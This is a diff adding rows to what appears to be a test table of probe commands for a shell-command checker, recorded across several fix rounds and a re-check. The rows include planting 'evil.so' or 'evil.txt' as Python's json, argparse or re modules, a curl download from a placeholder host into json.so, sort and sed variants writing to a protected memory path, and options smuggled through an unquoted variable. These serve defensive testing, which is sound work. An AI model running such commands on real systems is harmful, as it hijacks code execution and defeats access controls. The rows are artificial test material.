+verifier of 5d41d266 (CRW-894 fix round 2)	cp -r pkg/. .; printf '{}' | python3 -m json.tool	CRW-894-vr-10	row	-
+verifier of 5d41d266 (CRW-894 fix round 2)	mv evil.so json.so; printf '{}' | python3 -m json.tool	CRW-894-vr-11	row	-
+verifier of 5d41d266 (CRW-894 fix round 2)	install evil.so json.so; printf '{}' | python3 -m json.tool	CRW-894-vr-12	row	-
+verifier of 5d41d266 (CRW-894 fix round 2)	ln -s evil.so json.so; printf '{}' | python3 -m json.tool	CRW-894-vr-13	row	-
+verifier of 5d41d266 (CRW-894 fix round 2)	for i in 1 2; do printf '{}' | python3 -m json.tool; cp evil.so json.so; done	CRW-894-vr-14	row	-
+verifier of 5d41d266 (CRW-894 fix round 2)	printf '{}' | python3 -m json.tool & cp evil.so json.so; wait	CRW-894-vr-15	row	-
+verifier of 5d41d266 (CRW-894 fix round 2)	cat evil.so > sub/json.so; printf '{}' | python3 -m json.tool	CRW-894-vr-16	row	-
+verifier of 5d41d266 (CRW-894 fix round 2)	tar xf evil.tar; printf '{}' | python3 -m json.tool	CRW-894-vr-17	row	-
+verifier of 5d41d266 (CRW-894 fix round 2)	unzip -o evil.zip; printf '{}' | python3 -m json.tool	CRW-894-vr-18	row	-
+verifier of 5d41d266 (CRW-894 fix round 2)	python3 -c "import shutil; shutil.copy('evil.so', 'json.so')"; printf '{}' | python3 -m json.tool	CRW-894-vr-19	row	-
+verifier of 5d41d266 (CRW-894 fix round 2)	curl -so json.so https://example.invalid/x; printf '{}' | python3 -m json.tool	CRW-894-vr-20	row	-
+verifier of 5d41d266 (CRW-894 fix round 2)	dd if=evil.so of=json.so; printf '{}' | python3 -m json.tool	CRW-894-vr-21	row	-
+verifier of 5d41d266 (CRW-894 fix round 2)	cp evil.so "$N"; printf '{}' | python3 -m json.tool	CRW-894-vr-22	row	-
+verifier of 5d41d266 (CRW-894 fix round 2)	bash -c 'cp evil.so json.so'; printf '{}' | python3 -m json.tool	CRW-894-vr-23	row	-
+verifier of 5d41d266 (CRW-894 fix round 2)	cat evil.so > json.so & printf '{}' | python3 -m json.tool	CRW-894-vr-24	row	-
+verifier of 5d41d266 (CRW-894 fix round 2)	cat evil.so > "$N"; printf '{}' | python3 -m json.tool	CRW-894-vr-25	row	-
+verifier of 5d41d266 (CRW-894 fix round 2)	grep '"pr": *737' alerts.jsonl | tail -1 | python3 -m json.tool | head -80	CRW-894-vr-26	row	-
+verifier of 5d41d266 (CRW-894 fix round 2)	cat in.json | python3 -m json.tool > out.json	CRW-894-vr-27	row	-
+verifier of 5d41d266 (CRW-894 fix round 2)	echo '{}' | python3 -m json.tool 2>&1 | head -5	CRW-894-vr-28	row	-
+verifier of 5d41d266 (CRW-894 fix round 2)	echo '{}' > in.json; python3 -m json.tool < in.json	CRW-894-vr-29	row	-
+verifier of 5d41d266 (CRW-894 fix round 2)	cd sub && printf '{}' | python3 -m json.tool	CRW-894-vr-30	row	-
+verifier of 5d41d266 (CRW-894 fix round 2)	printf '{}' | python3 -m json.tool	CRW-894-vr-31	row	-
+verifier of 5d41d266 (CRW-894 fix round 2)	printf '{}' | python3 -m json.tool	CRW-894-vr-32	row	-
+verifier of 5d41d266 (CRW-894 fix round 2)	printf '{}' | python3 -m json.tool	CRW-894-vr-33	row	-
+verifier of 5d41d266 (CRW-894 fix round 2)	printf '{}' | python3 -m json.tool	CRW-894-vr-34	row	-
+verifier of 5d41d266 (CRW-894 fix round 2)	cat evil.txt > argparse.py; printf '{}' | python3 -m json.tool	CRW-894-vr-35	row	-
+verifier of 5d41d266 (CRW-894 fix round 2)	cat evil.txt > re/__init__.py; printf '{}' | python3 -m json.tool	CRW-894-vr-36	row	-
+verifier of 5d41d266 (CRW-894 fix round 2)	printf '{}' | python3 -m json.tool	CRW-894-vr-37	row	-
+verifier of 5d41d266 (CRW-894 fix round 2)	printf '{}' | python3 -m json.tool	CRW-894-vr-38	row	-
+verifier of b7d8826d (CRW-894 fix round 4)	if true; then :; fi; printf x | python3 stdin	CRW-894-vg-01	row	-
+verifier of b7d8826d (CRW-894 fix round 4)	if true; then :; else :; fi; printf x | python3 fd/0	CRW-894-vg-02	row	-
+verifier of b7d8826d (CRW-894 fix round 4)	printf x | python3 stdin	CRW-894-vg-03	row	-
+verifier of b7d8826d (CRW-894 fix round 4)	case x in x) :;; esac; printf x | python3 stdin	CRW-894-vg-04	row	-
+verifier of b7d8826d (CRW-894 fix round 4)	if true; then cd "$D"; fi; printf '...' | python3 dev/stdin	CRW-894-vg-06	row	-
+verifier of b7d8826d (CRW-894 fix round 4)	if true; then cd "$A"; else cd "$B"; fi; printf '...' | python3 dev/stdin	CRW-894-vg-07	row	-
+verifier of b7d8826d (CRW-894 fix round 4)	for i in 1; do cd "$D"; done; printf '...' | python3 dev/stdin	CRW-894-vg-08	row	-
+verifier of b7d8826d (CRW-894 fix round 4)	if true; then :; fi; printf '...' | python3 /dev/./stdin	CRW-894-vg-09	row	-
+verifier of 8b02f7be (CRW-894 fix round 5)	for i in 1 2; do :; done; printf x | python3 stdin	CRW-894-vh-01	row	-
+verifier of 8b02f7be (CRW-894 fix round 5)	while false; do :; done; printf x | python3 fd/0	CRW-894-vh-02	row	-
+verifier of 8b02f7be (CRW-894 fix round 5)	for i in 1; do :; done; printf x | node stdin	CRW-894-vh-03	row	-
+verifier of 8b02f7be (CRW-894 fix round 5)	until true; do :; done; printf x | python3 stdin	CRW-894-vh-04	row	-
+verifier of 8b02f7be (CRW-894 fix round 5)	for i in 1 2; do echo "$i"; n=$i; done; printf x | python3 stdin	CRW-894-vh-05	row	-
+verifier of 8b02f7be (CRW-894 fix round 5)	case x in x) : ;& y) : ;; esac; printf x | python3 stdin	CRW-894-vh-06	row	-
+verifier of 8b02f7be (CRW-894 fix round 5)	for i in 1 2; do cd "$D"; done; printf '...' | python3 dev/stdin	CRW-894-vh-07	row	-
+verifier of 8b02f7be (CRW-894 fix round 5)	for i in 1; do cd /; done; printf '...' | python3 dev/stdin	CRW-894-vh-08	row	-
+verifier of 8b02f7be (CRW-894 fix round 5)	while false; do pushd "$D"; done; printf '...' | python3 dev/stdin	CRW-894-vh-09	row	-
+verifier of 8b02f7be (CRW-894 fix round 5)	until true; do popd; done; printf '...' | python3 dev/stdin	CRW-894-vh-10	row	-
+verifier of 8b02f7be (CRW-894 fix round 5)	f() { cd "$D"; }; for i in 1; do f; done; printf '...' | python3 dev/stdin	CRW-894-vh-11	row	-
+verifier of 8b02f7be (CRW-894 fix round 5)	while cd "$D"; do break; done; printf '...' | python3 dev/stdin	CRW-894-vh-12	row	-
+verifier of 8b02f7be (CRW-894 fix round 5)	case x in x) cd "$D" ;& y) : ;; esac; printf '...' | python3 dev/stdin	CRW-894-vh-13	row	-
+verifier of 8b02f7be (CRW-894 fix round 5)	for i in 1 2; do :; done; printf '...' | python3 /dev/./stdin	CRW-894-vh-14	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sort --o=<m>/a x.txt	CRW-941-S01	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sort --o <m>/a x.txt	CRW-941-S02	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sort --ou=<m>/a x.txt	CRW-941-S03	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sort --ou <m>/a x.txt	CRW-941-S04	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sort --out=<m>/a x.txt	CRW-941-S05	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sort --out <m>/a x.txt	CRW-941-S06	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sort --outp=<m>/a x.txt	CRW-941-S07	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sort --outp <m>/a x.txt	CRW-941-S08	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sort --outpu=<m>/a x.txt	CRW-941-S09	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sort --outpu <m>/a x.txt	CRW-941-S10	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sort --output <m>/a x.txt	CRW-941-S11	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sort -o<m>/a x.txt	CRW-941-S12	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sort -o <m>/a x.txt	CRW-941-S13	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sort -ro <m>/a x.txt	CRW-941-S14	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sort -ro<m>/a x.txt	CRW-941-S15	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sort x.txt --o=<m>/a	CRW-941-S16	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sort -n -k 1,1 --ou <m>/a x.txt	CRW-941-S17	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sort --o=<m>/a <<'EOF'\nb\na\nEOF	CRW-941-S18	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sort --ou <m>/a <<'EOF'\nb\na\nEOF	CRW-941-S19	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sort --key=1 --o <m>/a x.txt	CRW-941-S20	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sort -t, --o=<m>/a x.txt	CRW-941-S21	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sort --o="<m>/a" x.txt	CRW-941-S22	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	cat x.txt | sort --o <m>/a	CRW-941-S23	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sort --compress-program gzip --o <m>/a x.txt	CRW-941-S24	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sort --o="$OUT" x.txt	CRW-941-S25	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sort -k1,1 -o <m>/a x.txt	CRW-941-S26	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sort -nr --ou=<m>/a x.txt	CRW-941-S27	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sort --o=out.txt x.txt	CRW-941-S28	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sort --ou out.txt x.txt	CRW-941-S29	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sort --o={TMP}/out x.txt	CRW-941-S30	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sort -- --o=<m>/a	CRW-941-S31	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sort --s=<m>/a x.txt	CRW-941-S32	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sort --so=<m>/a x.txt	CRW-941-S33	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sort --key -o <m>/a	CRW-941-S34	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sort --reverse --unique --version-sort x.txt	CRW-941-S35	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sort -u -n -k2,2 x.txt	CRW-941-S36	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed --expression 'w <m>/a' x.txt	CRW-941-E01	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed --expression='w <m>/a' x.txt	CRW-941-E02	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed --expr='w <m>/a' x.txt	CRW-941-E03	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed --expr 'w <m>/a' x.txt	CRW-941-E04	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed --exp 'w <m>/a' x.txt	CRW-941-E05	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed --e='w <m>/a' x.txt	CRW-941-E06	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed --e 'w <m>/a' x.txt	CRW-941-E07	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed --expressio='w <m>/a' x.txt	CRW-941-E08	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed -n --expression 'w <m>/a' x.txt	CRW-941-E09	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed --expression p --expression 'W <m>/a' x.txt	CRW-941-E10	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed --expression 'w <m>/a' <<'EOF'\nabc\nEOF	CRW-941-E11	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed --exp='w <m>/a' <<'EOF'\nabc\nEOF	CRW-941-E12	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed -e'w <m>/a' x.txt	CRW-941-E13	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed -ne 'w <m>/a' x.txt	CRW-941-E14	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed -n -e p -e 's/a/b/w <m>/a' x.txt	CRW-941-E15	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed -n -- 'w <m>/a' x.txt	CRW-941-E16	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed 'p;w <m>/a' x.txt	CRW-941-E17	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed 'p\nw <m>/a' x.txt	CRW-941-E18	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed 's/a/b/gw <m>/a' x.txt	CRW-941-E19	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed 's/a/b/2w <m>/a' x.txt	CRW-941-E20	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed 'sxaxbxw <m>/a' x.txt	CRW-941-E21	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed -n '/x/{p;w <m>/a\n}' x.txt	CRW-941-E22	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed -E 's/(a)/\1/w <m>/a' x.txt	CRW-941-E23	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed -l 5 'w <m>/a' x.txt	CRW-941-E24	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed --line-length 5 'w <m>/a' x.txt	CRW-941-E25	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed --line-length=5 'w <m>/a' x.txt	CRW-941-E26	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed --line 5 'w <m>/a' x.txt	CRW-941-E27	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed -s 'w <m>/a' x.txt y.txt	CRW-941-E28	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed --quiet 'w <m>/a' x.txt	CRW-941-E29	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed --silent 'w <m>/a' x.txt	CRW-941-E30	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed --regexp-extended 'w <m>/a' x.txt	CRW-941-E31	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed --regexp 'w <m>/a' x.txt	CRW-941-E32	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed --null-data 'w <m>/a' x.txt	CRW-941-E33	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed --zero-terminated 'w <m>/a' x.txt	CRW-941-E34	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed --z 'w <m>/a' x.txt	CRW-941-E35	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed --posix 'w <m>/a' x.txt	CRW-941-E36	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed -z -u 'w <m>/a' x.txt	CRW-941-E37	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed 'q;w <m>/a' x.txt	CRW-941-E38	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed 'q5;w <m>/a' x.txt	CRW-941-E39	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed -n 'l 5;w <m>/a' x.txt	CRW-941-E40	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed 'b end;w <m>/a;:end' x.txt	CRW-941-E41	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed ':a;w <m>/a;ba' x.txt	CRW-941-E42	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed -n -e p -e 'w <m>/a' <<'EOF'\nabc\nEOF	CRW-941-E43	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed "w $X/a" x.txt	CRW-941-E44	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed 't end;w <m>/a;:end' x.txt	CRW-941-E45	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed 'w <m>/a' x.txt -n	CRW-941-E46	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed --file s.sed x.txt	CRW-941-F01	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed --file=s.sed x.txt	CRW-941-F02	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed --fi=s.sed x.txt	CRW-941-F03	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed --fil s.sed x.txt	CRW-941-F04	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed -nf s.sed x.txt	CRW-941-F05	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed -fs.sed x.txt	CRW-941-F06	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed -e p -f s.sed x.txt	CRW-941-F07	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed --file=- <<'EOF'\nw <m>/a\nEOF	CRW-941-F08	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed --file - x.txt <<'EOF'\nw <m>/a\nEOF	CRW-941-F09	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	printf 'w <m>/a\n' > s.sed; sed -f s.sed x.txt	CRW-941-F10	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	cat > s.sed <<'EOF'\nw <m>/a\nEOF\nsed -f s.sed x.txt	CRW-941-F11	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed --f s.sed x.txt	CRW-941-F12	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed --s p x.txt	CRW-941-F13	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed --no-such-option p x.txt	CRW-941-F14	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed -i 's/a/b/' <m>/a	CRW-941-I01	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed --in-place 's/a/b/' <m>/a	CRW-941-I02	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed --in 's/a/b/' <m>/a	CRW-941-I03	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed --i=.bak 's/a/b/' <m>/a	CRW-941-I04	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed --in-place=.bak -e p <m>/a	CRW-941-I05	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed -i -e 's/a/b/' <m>/a	CRW-941-I06	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed -ni p <m>/a	CRW-941-I07	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed -i.bak 's/a/b/' <m>/a	CRW-941-I08	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed --in-pl --expression 's/a/b/' <m>/a	CRW-941-I09	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed --in-place 's/a/b/' out.txt	CRW-941-I10	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed --in=.bak 's/a/b/' out.txt	CRW-941-I11	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed --expression 's/a/b/' x.txt	CRW-941-C01	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed --expr=p x.txt	CRW-941-C02	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed --quiet --expression=p x.txt	CRW-941-C03	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed -n -e 's/w/x/' x.txt	CRW-941-C04	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed 'y/w/x/' x.txt	CRW-941-C05	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed -n '/w a/p' x.txt	CRW-941-C06	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed 'w out.txt' x.txt	CRW-941-C07	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed 's/a/b/w out.txt' x.txt	CRW-941-C08	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed --expr='w out.txt' x.txt	CRW-941-C09	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed -e 'w /dev/stdout' x.txt	CRW-941-C10	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed --expression 'w /dev/stderr' x.txt	CRW-941-C11	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed 'r <m>/a' x.txt	CRW-941-C12	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed 'R <m>/a' x.txt	CRW-941-C13	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed 'a w <m>/a' x.txt	CRW-941-C14	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed '1i w <m>/a' x.txt	CRW-941-C15	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed -n p <<'EOF'\nabc\nEOF	CRW-941-C16	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed ':a;N;$!ba;s/\n/ /g' x.txt	CRW-941-C17	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed -n '/a/{p;q}' x.txt	CRW-941-C18	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed 's/a/b/;t end;s/c/d/;:end' x.txt	CRW-941-C19	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed '1d;$d' x.txt	CRW-941-C20	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed -s -n '$p' x.txt y.txt	CRW-941-C21	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed -E 's/(a|b)/\1/' x.txt	CRW-941-C22	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed -n 'l 5;q5' x.txt	CRW-941-C23	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed -n p x.txt | sort --o=out.txt	CRW-941-C24	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed -e 's/a/b/' -e 's/c/d/' x.txt	CRW-941-C25	row	-
+re-check of CRW-941 on dev 09e5c5bcc (2026-10-09, probe sources under mgmt/recheck-20261009)	sed -n -- p x.txt	CRW-941-C26	row	-
+pre-merge evaluation of 101be077 (/state/crw/mgmt/pre-eval/crw941-101be077.json, defects d1 to d4)	K='1 -o {MEMORY}/a'; sort -k $K x.txt	CRW-941-N01	row	-
+pre-merge evaluation of 101be077 (/state/crw/mgmt/pre-eval/crw941-101be077.json, defects d1 to d4)	K='1 -o {MEMORY}/a'; sort --key $K x.txt	CRW-941-N02	row	-
+pre-merge evaluation of 101be077 (/state/crw/mgmt/pre-eval/crw941-101be077.json, defects d1 to d4)	K='1G -o {MEMORY}/a'; sort -S $K x.txt	CRW-941-N03	row	-
+pre-merge evaluation of 101be077 (/state/crw/mgmt/pre-eval/crw941-101be077.json, defects d1 to d4)	K=', -o {MEMORY}/a'; sort -rt $K x.txt	CRW-941-N04	row	-
+pre-merge evaluation of 101be077 (/state/crw/mgmt/pre-eval/crw941-101be077.json, defects d1 to d4)	K='1G -o {MEMORY}/a'; sort --buffer-size=$K x.txt	CRW-941-N05	row	-
+pre-merge evaluation of 101be077 (/state/crw/mgmt/pre-eval/crw941-101be077.json, defects d1 to d4)	K=1; sort -k $K -o out.txt x.txt	CRW-941-N06	row	-
